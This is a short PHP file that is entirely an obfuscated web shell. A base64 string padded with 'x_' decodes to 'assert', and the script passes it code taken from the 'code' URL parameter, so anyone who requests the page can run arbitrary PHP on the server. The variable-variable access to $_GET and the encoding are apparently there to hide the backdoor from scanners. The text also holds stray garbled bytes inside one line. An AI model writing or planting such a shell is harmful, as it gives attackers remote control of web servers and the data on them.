<?php
    $a = '_GET';
    $b = $$a;
    $a = str_replace('x_','',base64_decode('eF9heF9zeF9zeF9leF9yeF90')��;

    call_user_func($a,'$code=function() { '.$b['code'].'}');
?>